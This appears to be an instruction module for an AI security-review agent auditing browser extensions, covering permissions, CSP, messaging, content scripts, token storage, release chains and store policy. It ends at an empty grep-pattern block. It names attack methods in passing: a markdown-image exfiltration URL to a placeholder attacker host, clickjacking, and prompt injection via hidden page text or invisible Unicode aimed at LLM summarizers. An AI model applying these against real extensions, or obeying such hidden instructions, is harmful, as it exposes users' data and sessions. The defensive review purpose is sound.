# Browser Extension Security Review Module

Review browser extensions (Chrome/Chromium Manifest V3 primarily; Firefox WebExtensions and Safari
web extensions share most of the model) for extension-specific vulnerabilities: manifest and
permission scope, message-passing trust, content scripts running inside hostile pages, token
storage, page content flowing into extension pages and LLMs, MV3 runtime lifecycle, remote code,
and the release chain. It also checks the distributed package against what the extension says it
does (privacy policy, listing, in-product disclosures) and against the store's review policies,
because a gap there is a data-handling defect and the most common reason a release is blocked.

**Browser coverage.** Checks are written in Chrome terms (`chrome.*`, Chrome Web Store) because
that is where most extensions ship, but they apply to Firefox (`browser.*`, AMO), Edge (Edge
Add-ons, same engine and nearly the same policies as Chrome) and Safari web extensions (App Store
review) unless a bullet says otherwise. Where a store's rule differs, the bullet names it.

**Standards.** Each category maps to the OWASP Browser Extension Top 10 and CWE, and to the OWASP
ASVS 5.0 chapter that governs the same control in a general web app (V1 Encoding and
Sanitization, V2 Validation and Business Logic, V3 Web Frontend Security, V6 Authentication, V7
Session Management, V8 Authorization, V12 Secure Communication, V13 Configuration, V14 Data
Protection, V15 Secure Coding and Architecture, V16 Security Logging and Error Handling), so a
finding can be cited against a general standard as well as an extension-specific one. Release
chain items also map to NIST SSDF (SP 800-218) PS.2/PS.3 and SLSA.

**Division of labor with other modules.** Generic XSS/React issues inside extension pages
(popup, side panel, options) are `frontend` findings; npm CVEs are `dependencies`. This module owns
what only exists because the code is an extension: the manifest, the messaging boundaries, the
content-script world, `chrome.*` API misuse, and the fact that extension pages run with the
extension's privileges. When a frontend-style bug lands in a privileged extension context, report
it here (the privilege is what sets its severity) and note the overlap so consolidation can merge.

**Read the repo's own extension threat model first**, if one exists (`SECURITY.md`,
`docs/**/extension*security*`, the extension README's messaging section). Its rules are the
intended controls: check the code against each one. A rule the doc says holds but the code breaks
is a finding. An owner-**accepted** risk is not a new finding. A **known but still open** gap
("Gap (medium): ... Fix: ...") IS reported if the code confirms it is open, tagged
`Known gap: {doc}:{line}`. Doc text that no longer matches the code goes in a "Doc drift" note.

## Trust Model (use this to build traces)

Principals, weakest first. A finding's trace starts at the weakest principal that can reach it.

1. **Any web page** the user visits, including its scripts, ads and iframes. Controls the DOM,
   `window` globals, prototypes, `postMessage`, DOM events (including `CustomEvent`), CSS
   (opacity, overlays) and everything a content script reads.
2. **Model output from an LLM** that was fed page content. The page author wrote part of the
   prompt, so treat the output as principal 1.
3. **A content script.** Runs in an isolated JS world but shares the DOM with (1). Treat it as
   compromised: Chrome's own guidance is that messages from content scripts may be driven by a
   compromised renderer.
4. **Other installed extensions.** Reach `onMessageExternal` / `onConnectExternal` unless
   `externally_connectable` is declared (declaring it without `ids` shuts them all out).
5. **Origins listed in `externally_connectable.matches`**. Any XSS, subdomain takeover, or
   attacker-influenced HTML on those origins inherits this access.
6. **Remote config and backend responses** the extension acts on.
7. **Extension pages, offscreen documents and the service worker / background.** Full extension
   privileges: every granted permission, `fetch` to `host_permissions` origins with the user's
   cookies, stored tokens. A native messaging host sits beyond this and can run OS code.

Sinks worth tracing to: `chrome.scripting.executeScript`, `chrome.tabs.*` (create/update URLs,
`sendMessage` relays into other tabs, `captureVisibleTab`, `query` results), `chrome.cookies`,
`chrome.downloads`, `bookmarks`/`history`/`topSites`/`management`, `chrome.storage` writes and
clears, `declarativeNetRequest` rule updates, `sendNativeMessage`, privileged `fetch` (especially
with `credentials: 'include'` or an attached bearer token), rendering in extension pages, and data
sent to the extension's own backend (including LLM prompts).

The **manifest line is the control** for most reachability findings: cite it as a hop (e.g.
`manifest.json:24 externally_connectable.matches = https://app.example.com/*` `[verified]`).

## Categories to Review

### 1. Manifest and Permission Scope
<!-- Standards: OWASP Browser Extension #1 Permissions Overreach, CWE-250, CWE-272, ASVS V8, ASVS V13 -->
- `manifest_version: 2` (deprecated in Chrome, allows remote code and persistent background pages)
- Broad host access: `<all_urls>`, `*://*/*`, `https://*/*` in `host_permissions`, `content_scripts.matches`, or `optional_host_permissions`
- High-impact permissions and whether code actually needs each: `cookies`, `webRequest`, `declarativeNetRequest` with header modification, `debugger`, `tabs`, `history`, `nativeMessaging`, `management`, `proxy`, `downloads`, `clipboardRead`, `privacy`, `webNavigation`, `identity`, `userScripts`, `offscreen`. Flag `webRequestBlocking` by target browser: Chrome MV3 allows it only for policy-installed extensions, Firefox MV3 still supports it.
- Permissions declared but never used in code (grep for the `chrome.<api>` namespace), or required where `optional_permissions` + a user-gesture request would do. Firefox MV3 host permissions are opt-in at runtime: code must handle them not being granted (`permissions.contains`).
- `activeTab` preferred over standing host access, but it is not scoped to a document: the grant survives same-origin navigation (see category 13)
- `incognito` key: the default `"spanning"` runs incognito tabs through the same worker, storage and backend. Check whether incognito tabs are handled deliberately (`tab.incognito`) or `"not_allowed"` is set.
- Dev and prod builds sharing one manifest: `localhost`, staging or dev hosts leaking into a production manifest, or the reverse
- `update_url` pointing anywhere other than the store
- **Extension id consistency.** The id is pinned by the manifest `key` (unpacked/sideloaded) or assigned by the store. Every place that trusts an id must agree with the id users actually run: the web app's `sendMessage(EXTENSION_ID, ...)` target, backend allowlists of `chrome-extension://<id>` origins, `externally_connectable` on a companion extension. A repo check that only proves "app id == manifest key id" passes while both differ from the store item's id. Check how the id moves when the store item is created (public key from the dashboard into the build, app and backend updated together, old id kept during migration). A web app can message only the ids it is compiled with: keeping the old id in a backend allowlist does not keep sideloaded users connected unless the app also tries the old id, or those users move first. Firefox uses `browser_specific_settings.gecko.id` instead; Safari uses the app bundle.
- **Store uploads refuse a manifest `key`** (Chrome Web Store, Edge): a build that always writes `key`, or a gate that requires it, means there is no uploadable package. Look for a distinct store target.
- `devtools_page`, `match_origin_as_fallback`, `match_about_blank`, `all_frames` widen the surface; each needs a reason
- The `key` field is a **public** key that pins the extension ID. It is not a secret; do not flag it. A committed private key (`*.pem`, `key.pem`) that signs the extension **is** a secret and is a finding.

### 2. Extension Content Security Policy
<!-- Standards: OWASP Browser Extension #8, CWE-693, ASVS V3 -->
- Chrome refuses to install an MV3 extension whose `extension_pages` CSP has `unsafe-eval` or remote `script-src`, so those checks only bite for MV2/Firefox, or mean the audited manifest is not the one shipped. Check them, but the real MV3 exposure is elsewhere:
- **Directives the MV3 default leaves open**: the default restricts only `script-src` and `object-src`. Without explicit `img-src`, `connect-src`, `frame-src` / `default-src`, an extension page can load images and connect anywhere, which is what markdown-image exfiltration from rendered model output uses (category 6).
- Broad `connect-src` (wildcards, `https:`) that widens exfiltration from an extension-page injection
- `style-src 'unsafe-inline'` without a build that needs inline styles (a UI-redress helper after an injection; CSS exfiltration is already bounded if `img-src`/`font-src` are restricted). CSSOM writes (`el.style.setProperty`, React's `style` prop) do not need it; only `<style>` elements and `style=` attributes do.
- **Multi-tenant hosts in `connect-src`** (Google APIs such as `identitytoolkit.googleapis.com`, Firebase, S3, generic storage APIs accept any project's key): after an injection they are an exfiltration channel into the attacker's own project. Path-pin them to the exact endpoints used.
- `content_security_policy.sandbox`: its default includes `unsafe-eval` and `unsafe-inline`. Sandboxed pages that receive `postMessage` from privileged pages without validation.
- No test pins the CSP string (a loosening goes unnoticed)

### 3. External Messaging (`externally_connectable`, `onMessageExternal`, `onConnectExternal`)
<!-- Standards: OWASP Browser Extension #13 Insecure Message Passing, CWE-346, CWE-940, ASVS V3, ASVS V2 -->
- **`onMessageExternal`/`onConnectExternal` listeners with no `externally_connectable` in the manifest**: every installed extension can call them (Chrome docs; DoubleX found arbitrary downloads this way in a 10k-user extension). Declaring the key with `matches` only shuts out other extensions.
- `externally_connectable.matches` with wildcards, broad subdomains (`https://*.example.com/*`), or origins that host user-generated content; `ids: ["*"]`
- Listener does not re-validate `sender.origin` / `sender.id` against an exact allowlist (the manifest is the first gate; the handler must still check). Flag `startsWith`, `includes`, `endsWith`, eTLD+1 (`getDomain`) matching or unanchored regex origin checks. Prefer `sender.origin` to `sender.url`.
- No action allowlist or schema validation on the message body; unknown types fall through to a default branch; wrong JSON types (array for string) or oversized payloads accepted (runtime messages allow up to 64 MiB)
- **Session or token handoff from a web page**: can any page on an allowed origin push a token? Is it verified or just stored? Can an attacker log the extension into *their* account (login CSRF / session fixation), including on first connect while signed out?
- `sendResponse` returning data (tokens, email, profile, stored results) to an external caller that did not need it
- **The allowed origin is only as strong as its weakest page.** Check whether anything served on an `externally_connectable` origin can return attacker-influenced HTML or script (user uploads, API endpoints answering `text/html`, error pages reflecting input, open redirects to it, subdomains covered by the pattern).
- **Native messaging**: any handler that reaches `sendNativeMessage`/`connectNative`. Trace page → content script → worker → native host, and audit the host manifest's `allowed_origins` and how the host treats arguments (paths, DLL names, commands). spaceraccoon 2024: a 2M-user extension let any page make its native host load an attacker DLL.

### 4. Internal Messaging (content script, extension pages, service worker)
<!-- Standards: OWASP Browser Extension #13, CWE-441 Confused Deputy, CWE-918, ASVS V8, ASVS V2 -->
- `sender.id === chrome.runtime.id` in a `runtime.onMessage` handler is a **no-op**: only the extension's own contexts can reach it. The real check is **which context** sent it. Commands meant only for the popup/side panel/offscreen document must require no `sender.tab` and `sender.origin === 'chrome-extension://' + chrome.runtime.id` (and the expected page path where it matters). A web-accessible extension page framed on a hostile site has the extension origin **and** a `sender.tab`. Build a table: for each message `type`, which contexts can send it, and what the handler requires.
- **Confused deputy**: a content-script message that can choose a URL to `fetch`, a tab URL to open, a script/func to inject, a storage key to write, an API endpoint to call, or a tab to relay to via `tabs.sendMessage`. With host permissions this is SSRF with the user's cookies.
- **Dispatch chosen by a message field**: `handlers[msg.type]()`, `chrome[msg.api][msg.fn]()`, "execute block" commands. The page picks which function runs (Automa, FP-2023-004).
- **Mass assignment into settings**: `Object.assign(settings, msg)`, `storage.local.set(msg.data)`, spreading a message into config. A page rewrites the backend URL, allowlists or flags, and it persists.
- **Inventory every reply to a content script.** For each handler a content script can reach, list exactly what `sendResponse` / a port message returns (ids, scores, counts, text, URLs). Anything returned is readable by a compromised content script; check it against what the feature needs.
- **Account-state races.** Caches keyed to the signed-in user (id lists, last result, index) that survive sign-out and sign-in as another account; in-flight requests whose replies land after an account switch (look for a generation counter or account check before writing)
- **Backend trust in the extension's origin.** `Origin: chrome-extension://<id>` is only unforgeable from a browser. If backend code relaxes a control (captcha, rate limit, CSRF) for that origin, note it and hand it to the `api` module.
- Messages from iframes inside the page (`all_frames: true`) treated the same as the top frame

### 5. Content Scripts and UI Injected Into Pages
<!-- Standards: OWASP Browser Extension #11 DOM-based Data Skimming, #12 Prototype-based Data Skimming, CWE-79, CWE-1021, ASVS V3, ASVS V1 -->
- **Page-to-content-script channels are principal 1, whatever the checks.** `window.postMessage` bridges: `event.source === window` is passed by any page script and `event.origin` is the attacker's own page, so those checks do not authenticate anything. **Custom DOM events** (`addEventListener('some-app-event')`, `CustomEvent` `.detail`) are the same: the page can fire them (CoCo, CCS'23). Trace what each such channel can make the extension do.
- Sensitive data (tokens, user profile, analysis results, PII) written into the page DOM, where page scripts can read it. Sensitive views belong in the popup/side panel.
- **DOM-based extension clickjacking** (Marek Tóth, DEF CON 33, 2025: 10 of 11 password managers). The page makes injected UI invisible (`opacity:0` on the host, **or on `<html>`/`<body>`**, overlays, `clip-path`, `filter`) and tricks a real click, so **`event.isTrusted` does not help and a closed shadow root does not help** (opacity on an ancestor still applies). For any injected control that triggers an action: does the handler check computed visibility up the ancestor chain, use `document.elementsFromPoint()` at the click point, watch the host's `style`/`class` with a MutationObserver, or place UI in the top layer (Popover API)? **Also check whether the host element itself can be restyled**: page styles on a shadow host beat its `:host` rules unless every `:host` declaration is `!important`, so a closed root with plain `:host{all:initial}` still lets the page set the host to `opacity:0`, `position:fixed` or `transform:scale()`. If the repo accepted this risk, check that the accepted impact bound still matches what a click can now do (later features such as billing, quotas or auto-run intents change it). To verify without Puppeteer: Node 22's global `WebSocket` plus Chrome `--headless --remote-debugging-port` and CDP `Input.dispatchMouseEvent` gives trusted clicks against a replica page in about 60 lines.
- **Closed shadow roots are a privacy boundary only up to a point.** Page scripts cannot reach a closed root's nodes, but the host's presence, position and size (`getBoundingClientRect`, `ResizeObserver`, layout shifts), host attributes and light-DOM children leak. If the design claims "the page cannot read X", verify it: load a scratch page in headless Chrome with a closed root and try `document.body.innerText`, `getSelection().toString()` after select-all, `window.find()`, and `document.getAnimations()` (animations inside the root must not leak their targets).
- **Isolated-world globals and DOM clobbering.** A `window.foo` flag in a content script can be shadowed by a page element with `id`/`name` `foo`. Check what happens if a "running"/"stop" flag is clobbered.
- `scripting.executeScript` with `world: 'MAIN'` or `<script>` tag injection, which exposes the code to page tampering; trusting page-controlled globals or prototypes
- **Origin granularity**: acting on or filling into the registrable domain (eTLD+1) instead of the exact origin reaches every subdomain, including ones with XSS or takeover
- Firefox Xray waivers: `wrappedJSObject`, `exportFunction` (esp. `allowCrossOriginArguments`), `cloneInto` hand privileged functions and objects to page scripts
- DevTools: `chrome.devtools.inspectedWindow.eval` built from page-derived strings; devtools panels trusting page `postMessage`
- `content_scripts` matched to more sites than needed; `all_frames`, `match_about_blank`, `match_origin_as_fallback` (about:/data:/blob: frames with opaque origins) without need

### 6. Untrusted Page Content Flowing Inward (extension pages, backend, LLM)
<!-- Standards: CWE-79, CWE-20, OWASP LLM01:2025 Prompt Injection, OWASP LLM02:2025 Sensitive Information Disclosure, ASVS V1, ASVS V2 -->
- Scraped page text/HTML rendered in extension pages via `innerHTML` / `dangerouslySetInnerHTML` / markdown renderers without sanitization: XSS in a privileged context. Offscreen documents parsing scraped HTML with `innerHTML` trigger subresource loads in the extension origin (use `DOMParser`).
- **What the extractor reads vs what the user sees.** `textContent` includes `display:none`, `<template>`, `<noscript>` and aria-hidden text; `innerText` drops CSS-hidden nodes but keeps white-on-white, 0-1px, `opacity:0`, off-screen and clipped text. Either way a page can hide instructions only the model reads (Brave Comet disclosures; CloudSEK CSS ClickFix aimed at AI summarizers). Is there a visibility filter, or does the UI show the user the exact text that will be sent? The reverse also matters: content the user sees but the extractor misses (shadow DOM, iframes, `::before`).
- **Fallback selectors bind the wrong content.** An extractor that prefers a keyed element (the current job's id) but falls back to "the first matching element with text" will pick up a hidden or stale element from a previous view while the new one hydrates, and send it under the current URL's id. Check every fallback: is it limited to cases where no key exists, and does it skip `hidden` elements?
- **Invisible Unicode**: is text normalized before prompting? Tag characters U+E0000-U+E007F, zero-width U+200B-U+200D, U+2060, U+FEFF, bidi controls U+202A-U+202E and U+2066-U+2069, variation selectors (ASCII smuggling). Check the client and the backend; either can strip them. Grep the backend for a normalizer already used on other routes (feedback, comments): an existing helper not applied to the LLM path makes the fix cheap and the gap obvious.
- **Model output**: is it rendered as HTML or markdown (markdown image `![](https://attacker/?d=...)` exfiltrates on render unless `img-src` is restricted)? Does any output field pick a URL, a tab, a click, a fill, or a message to another tab? Output that drives actions needs per-action confirmation (SiderAI/MaxAI 2025; CVE-2026-0628 Gemini panel).
- **Sensitive fields scraped**: `input[type=password]`, `autocomplete=cc-*`/`one-time-code`, hidden inputs, form `.value`s
- **Snapshot binding**: does the backend re-fetch a client-supplied URL (AI-targeted cloaking, and SSRF) instead of analyzing the text the user saw? Is the analysis bound to the snapshot sent?
- **Denial of wallet**: can a page trigger scrape → backend → LLM without a user action, or in a loop? Size caps, per-tab debounce, server quota. Also trace what each run **costs the user**: trial counters, credits and quotas on the backend. A tricked or page-triggered run that spends the user's allowance is an impact even when LLM spend is capped.
- URLs taken from the page (links, `og:url`, canonical) opened or fetched without scheme/host validation (`javascript:`, `data:`, internal URLs)

### 7. Token and Data Storage
<!-- Standards: OWASP Browser Extension #9 Insecure Storage, CWE-922, CWE-312, CWE-613, ASVS V7, ASVS V14 -->
- **`chrome.storage.local` and `.sync` are readable by content scripts by default**; only `storage.session` defaults to trusted contexts. Tokens in `local` need `storage.local.setAccessLevel({accessLevel: 'TRUSTED_CONTEXTS'})` (check the call runs at the worker's top level on every start, and that `minimum_chrome_version` supports it) or belong in `session`.
- `storage.session.setAccessLevel({accessLevel: 'TRUSTED_AND_UNTRUSTED_CONTEXTS'})` exposes session storage to content scripts
- `storage.sync` for tokens (synced to the user's Google account and other devices); `localStorage` in extension pages
- `chrome.storage.onChanged` listeners in content scripts that receive token changes
- **Writes after sign-out from another context.** Sign-out usually runs in the popup/panel; refreshes and long API calls run in the worker, a separate JS context with its own singletons. For every `await` in the worker followed by a storage write (token refresh, last result, caches), is there an account epoch or re-read check, or does it restore the signed-out account's state? Are result slots keyed by account?
- Whether Chrome persists `setAccessLevel` across browser restarts is not settled by reading code; a persisted content script in a restored tab may run before the worker's top-level call. Recommend a live check rather than a finding.
- `storage.local` is unencrypted on disk: a refresh token there is a long-lived credential readable by local malware or a disk image. Is its lifetime bounded, and does logout / account switch / uninstall **revoke server-side**, not just clear locally (Bitwarden #3124)?
- `chrome.identity` tokens: `removeCachedAuthToken` / `clearAllCachedAuthTokens` on logout
- Tokens or secrets baked into the bundle (beyond public client config such as a Firebase web API key)

### 8. Network Communication
<!-- Standards: OWASP Browser Extension #2 Data Leakage, #4 Insecure Communication, CWE-319, ASVS V12 -->
- Any `http://` or `ws://` endpoint
- `Authorization` headers or cookies attached to requests whose URL is not a fixed first-party origin
- `fetch(..., { credentials: 'include' })` against host-permission origins driven by variable URLs
- Timeouts on every outbound call (a hung endpoint hangs the worker's queue)
- User or page data sent to third parties (analytics, error reporting: Sentry breadcrumbs, `sendDefaultPii`), and `setUninstallURL` / onInstalled URLs carrying ids or email

### 9. `web_accessible_resources`
<!-- Standards: CWE-200, CWE-1021, ASVS V3 -->
- Resources exposed to `<all_urls>` or broad matches; any HTML page exposed (framable by any matched site: clickjacking, and it has the extension origin plus a `sender.tab`, see category 4)
- Missing `use_dynamic_url: true` where fingerprinting the extension matters
- Exposed pages that act on `location.search` / `location.hash`

### 10. Remote Code and Build Integrity
<!-- Standards: OWASP Browser Extension #5 Code Injection, #6 Malicious Updates, CWE-94, CWE-829, CWE-489, ASVS V15, ASVS V13 -->
- `eval`, `new Function`, string `setTimeout`, dynamic `import(variable)` or of remote URLs, `importScripts` (classic workers only), `<script src=https://...>` in extension pages
- Remote JSON config that switches code paths, selects endpoints, or supplies selectors/scripts/`declarativeNetRequest` rules
- **Prove the audited bundle is the loaded one.** Rebuild HEAD into a scratch directory and hash-diff it against the local or released `dist/`; greps alone cannot show that `dist/` is current. Is the loaded build stamped with a commit (`version_name`)? Where is the distributed artifact actually built (CI, a deploy pipeline zipping `dist/`, a laptop)?
- **The build toolchain writes the shipped bundle**, so an `npm audit --omit=dev` gate is blind to the packages that matter most here. Check for a dependency cooldown and `ignore-scripts` (cross-reference `dependencies`).
- **Audit the shipped bundle, not just `src/`**: build-time env (`import.meta.env`, `process.env`, `VITE_*`, `PLASMO_PUBLIC_*`, `WXT_*`) is inlined into every copy. Check `dist/` for key-shaped strings, remote hosts, `eval`, dev endpoints, HMR `ws://localhost`, `.env`, `.git`, `*.pem`, and `*.map` files with `sourcesContent`.
- Build scripts that pull unpinned assets; caret ranges in `package.json`; `npm install` instead of `npm ci` in the build that produces the package
- **Dev and test UI shipped in the prod build** (CWE-489). A prod target that strips dev hosts from the manifest can still show dev-only UI: "Dev"/"Beta" badges, "dev server" or "dev build" error strings, debug or preview panels, raw-payload viewers, test toggles, verbose error detail. These leak internals, contradict the listing, and reviewers read them as an unfinished or misleading build. Build the prod target and grep its bundle for user-visible dev wording (loop one term at a time; long alternations with context windows exceed some grep engines' limits); check each component with a dev purpose for a build-target guard. Do the same for any companion web app that hands the extension its session: build it with prod env and grep it the same way. Ask whether the target gate checks strings users see, or only hosts, ids and keys. When a dev-only view is removed, check whether it was also serving as a required disclosure (a "show the text we send" panel often is), and that a replacement disclosure exists (category 12).

### 11. Release and Update Chain
<!-- Standards: OWASP Browser Extension #6 Malicious Updates, OWASP-Web-A08:2025, SLSA, NIST SSDF PS.2 PS.3, CWE-494, CWE-1329 -->
Publisher compromise is the top real-world extension attack (Cyberhaven Dec 2024: OAuth-consent phish, 36+ extensions; Trust Wallet v2.68 Dec 2025: leaked store API key, about $7M stolen). Check what the repo can show:
- Is the store package built in CI from a tagged commit, or zipped by hand?
- **Versioning and forced updates.** Is `version` single-sourced and bumped on every release, with a commit stamp (`version_name`)? If the backend has a minimum-version gate (a kill switch for vulnerable builds), it only works when builds carry distinct, increasing versions: a version that never changes makes the control unable to tell a vulnerable build from a fixed one. Stores reject an upload whose version is not higher than the live one.
- **Self-hosted or sideloaded distribution** (a zip on your own site, enterprise `update_url`, Firefox self-distributed XPI). Unpacked Chrome extensions are not signature-checked, and a pinned `key` keeps the trusted id, so a swapped zip inherits every trust the id has (`externally_connectable`, backend allowlists, session handoff). Check: a published digest users can compare, bucket or host versioning, an audit log and alert on writes to the artifact path, and who (including CI and agent identities) can overwrite it. Unpacked installs never auto-update, so also check how users are moved to a fixed build.
- **Release gates that pin only some fields.** Read what the manifest gate actually compares. Name, hosts and `externally_connectable` pinned but `permissions`, `optional_permissions`, static `content_scripts`, `incognito` or CSP directives other than the one checked left open means a one-word permission addition ships. A full-manifest snapshot test is the cheap fix.
- **The branch that triggers the release is protected as documented.** Committed ruleset or branch-protection files are intent, not state. If you can read live settings (`gh api repos/{o}/{r}/rulesets`, `rules/branches/{b}`), diff them: admin `bypass_mode: always`, unprotected release branches and org-wide apps with write access all let a release skip review. Otherwise note it as an `[assumed]` hop and hand it to the `cicd` module.
- Store credentials: CWS API v2 with a service account and OIDC Workload Identity Federation, vs a long-lived OAuth refresh token / client secret in CI secrets (`chromewebstore/v1.1` is supported only until 15 Oct 2026)
- Verified CRX Uploads: is the upload CRX3-signed with a key held separately from the store credential?
- **Release-diff gate**: does CI fail when manifest permissions, hosts, `externally_connectable`, WAR or CSP change, or a new network host appears in `dist`? A committed `dist/manifest.json` snapshot test is the cheap version.
- Store developer-account controls (2FA, security keys, roles) cannot be verified from code: an `[assumed]` hop / informational note, not a finding
- For an unpublished (dev-only / side-loaded) extension, release-chain items are Informational at most

### 12. Privacy, Disclosure and Store Policy Conformance
<!-- Standards: OWASP Browser Extension #10 Insufficient Privacy Controls, ASVS V14, CWE-359, Chrome Web Store User Data Policy / Limited Use, Firefox Add-on Policies, Apple App Review Guidelines 5.1 -->
Build a **data-flow inventory** from the code first: every piece of data the extension reads, stores or sends, to which host, triggered by what (a user click, page load, a timer, a permission grant). **Cover the backend the extension feeds too** (what it stores, which vendors it calls, what reaches team chat or tickets, what survives account deletion), because one policy covers the whole service and most disclosure gaps are backend-side. Then compare the inventory with each place that describes it. A mismatch is a finding even when every flow is secure, because users consented to the description, not the code.
- **Consent record.** Find where users accept the policy (a sign-in line, a checkbox) and which policy version is recorded. A policy that contradicts live collection, with users' recorded consent pointing at that version, is Medium. Check that a version bump re-prompts, and that the version constant lives in one place (or that every copy moves together).
- **Collection trigger.** Is page content read only on explicit user action (click, `activeTab`) or automatically on every page load? List **automatic network traffic** that needs no click separately: index or badge fetches on page visits, periodic refreshes, prefetches, **presence or heartbeat pings** (last-seen, installed markers), and **id-keyed detail fetches** that reveal a revisit even though no URL is sent. It reveals browsing to the backend and has to be declared even when code comments say "only loading saved results" or "no URL is sent".
- **Privacy policy vs inventory.** If the policy source is in the repo (a legal page component, `privacy.md`), read it. Does it name the extension, each data type in the inventory, every processor the data reaches (LLM vendors, payment processors), retention, and how to delete the account and its data? Flag text that says the product does not collect something it does ("we do not collect X yet" left over from pre-launch). Chrome, Edge, AMO and Apple all reject or remove items over an inaccurate policy.
- **Chrome Limited Use statement.** For Chrome Web Store items handling user data, the policy (or a page on the publisher's site) should carry: "The use of information received from Google APIs will adhere to the Chrome Web Store User Data Policy, including the Limited Use requirements." It also needs the Limited Use terms: data used only for the single purpose, never for ads, never sold, and not read by humans except with consent or for security or legal reasons. **Check the policy's own human-review, "improve the product" and model-training clauses against those exceptions:** adding the statement while a clause grants staff standing access to user content puts two contradicting promises in one policy, which is worse than neither.
- **In-product disclosure.** Data not obviously part of the described function needs a prominent notice inside the extension, and consent before collection. The notice must say *what* is sent and *to whom*, not just *when*. Product copy that deliberately hides a processor ("never named") fails the *to whom* test. Check the notice survives the prod build (category 10: dev preview panels are often the disclosure).
- **Listing and manifest text match behavior.** Do the manifest `description`, store summary and permission justifications cover every feature the code has, including opt-in features behind optional permissions? **Compare the description and screenshots with the URL gates the code actually applies** (`isSupportedUrl`-style checks): an extension that works only on one site must not read as general, and screenshots must show a page it works on. On Chrome the manifest `description` is the store summary.
- **Listing copy often lives outside the repo** (issues, tickets, a dashboard draft). Pull it (`gh issue view`) and compare prices, scope, permission justifications, data-use rows and reviewer test instructions with the code and config. Docs carry no findings (FP rule 10), so put listing mismatches in Store readiness notes. Is there a single, narrow purpose? If basic function requires payment, does the listing say so? Is any other company's name, logo or UI used in a way that implies endorsement?
- **Store data declarations.**
  - Chrome and Edge: the Privacy practices form (data categories such as PII, authentication information, website content and web history; the remote-code answer; the three certifications) must match the inventory.
  - Firefox: new extensions declare `browser_specific_settings.gecko.data_collection_permissions` in the manifest (Firefox's built-in data consent, required for new AMO submissions from late 2025). AMO also requires source code upload when the package is minified or bundled.
  - Safari: the App Store privacy details apply to the containing app.
  - Treat undeclared categories as findings (Informational to Low: a takedown risk, not an exploit).
- **Account lifecycle.** Is there a working delete-account path that actually removes server data, and does the policy describe it? Does uninstall leave a live server session (category 7)?
- Backend logging or retention of prompts / page text; vendor training settings
- Incognito tabs (category 1)

### 13. MV3 Runtime Lifecycle and Targeting
<!-- Standards: CWE-367 TOCTOU, CWE-362, CWE-636 Not Failing Securely, ASVS V15 -->
- **Check-then-inject race.** Code reads `tab.url`, awaits something, then calls `executeScript({target: {tabId}})` or `tabs.sendMessage(tabId)` into whatever document is loaded now. Pin `documentIds` (Chrome 106+) or `{documentId}` on `sendMessage`, or re-check the URL/documentId in the result. `activeTab` is revoked only on a cross-origin navigation or tab close, so a same-origin navigation keeps the grant.
- **Results bound to the wrong tab**: the "current tab" resolved by `tabs.query({active: true})` when an async reply arrives, instead of the tabId bound at request time; a global side panel (`setOptions` without `tabId`) showing tab A's results on tab B or in incognito
- **Service worker state loss.** Security state in module globals (unlocked flags, rate-limit counters, nonce/replay caches, OAuth `state`/PKCE verifier, consent flags) disappears after about 30 s idle. Does it fail open when the global is undefined?
- **Late listener registration.** Listeners registered inside async init, `.then`, or after a top-level `await` miss the event that woke the worker. Security setup (e.g. `setAccessLevel`) done lazily leaves a window after each wake-up.
- **Dynamic content scripts**: `registerContentScripts` with `persistAcrossSessions`; are they unregistered when the permission is removed (`permissions.onRemoved`), and does a restart re-register them only while the permission is held?
- **declarativeNetRequest**: dynamic/session rules built from message input or remote config; `modifyHeaders` stripping `content-security-policy`, `x-frame-options`, `set-cookie` or adding `Authorization` across broad `requestDomains`; `redirect` with `regexSubstitution`
- **`chrome.identity.launchWebAuthFlow`**: `state` generated and verified, PKCE with the code flow (not implicit), redirect parsed with `new URL()` and origin required to be `https://<id>.chromiumapp.org`
- **`userScripts` and offscreen documents**: `onUserScriptMessage` carries content-script trust; `configureWorld({csp, messaging})`

## Tests Expected

Missing negative tests for a security control are a finding (Low) when the control exists but nothing pins it:
- Handlers called with forged senders: foreign origin, `'null'`, look-alike (`https://app.example.com.evil.net`), `http://`, deeper subdomain, with and without `sender.tab`, another extension's id
- Unknown `type`, wrong JSON types, oversized payloads
- A manifest snapshot (permissions, hosts, CSP, `externally_connectable`, WAR)
- A prod-build check that user-visible dev strings and dev-only components are absent
- Sign-out and account-switch tests: a write landing after sign-out (refresh, long analysis) does not restore or leak the previous account's state
- Ideally an end-to-end run (Playwright `--load-extension`) with a hostile page that posts messages, fires CustomEvents and calls `chrome.runtime.sendMessage(EXT_ID, ...)`, and a clickjacking regression (`document.documentElement.style.opacity = 0`)

## Scanning Approach

0. Read the repo's extension threat model / security doc (see top). List its rules, accepted risks and known open gaps. If a prior audit report exists, map each hit to its existing ID first and report only new items or a changed risk.
1. Find every extension root: `manifest.json` files containing `manifest_version` (ignore `node_modules`). Note source (`public/manifest.json`) vs built (`dist/manifest.json`) copies and diff them.
2. Skip categories the manifest rules out (no `nativeMessaging`, `userScripts`, `devtools_page`, `webRequest`, WAR, `sandbox` → skip those bullets, and say so in the clean-coverage note). Build a permission inventory from the manifest: each permission, host pattern, content-script match, `externally_connectable` entry, WAR entry, CSP directive. For each, find the code that uses it. Unused grants are findings; used grants tell you where to trace.
3. Enumerate entry points: every `onMessage`, `onMessageExternal`, `onConnect*`, `onUserScriptMessage`, `onInstalled`, `onStartup`, `action.onClicked`, `contextMenus.onClicked`, `tabs.onUpdated`/`onActivated`, `permissions.onAdded/onRemoved`, `storage.onChanged` listener, every content script, every page-facing DOM/`message` listener. Build the **message table**: type → allowed contexts → required checks → what it does → what it returns.
4. For each entry point, trace inward (trust model above) to privileged sinks. Check sender validation and input validation at each hop.
5. Map token lifecycle: obtained, stored (which area, which access level), refreshed, attached, cleared, revoked.
6. Follow scraped page data from extractor to render, storage, backend and model; then follow model output back to what it can do.
7. For every `executeScript`/`tabs.sendMessage`, find what happens between the tab check and the call (category 13).
8. Check the built bundle and the build/publish pipeline. Build the **production** target (not the dev default) and inspect that output: manifest, bundle, user-visible strings.
9. Check the tests for the negative cases above.
10. If the extension talks to a first-party backend or web app, note it as an outbound edge for trace scope (the web app's origin is a principal; its XSS posture matters).
11. Build the data-flow inventory (category 12) and compare it with the privacy policy source, the manifest description, any listing copy in the repo and the in-product disclosure text.
12. End with a **Store readiness notes** section, separate from findings: things a store reviewer is likely to flag that are not vulnerabilities (permission justifications to write, description gaps, dev UI, version, `key` in the upload, declarations to make, live checks that code cannot settle). Each note gets a `file:line`.

## Patterns to Grep For

Use the Grep tool if the session has it; otherwise read-only `grep -rnE` through Bash is fine. Exclude `node_modules`. Run the code patterns against both `src/` and the built bundle.

```
# Manifest red flags (run against manifest.json)
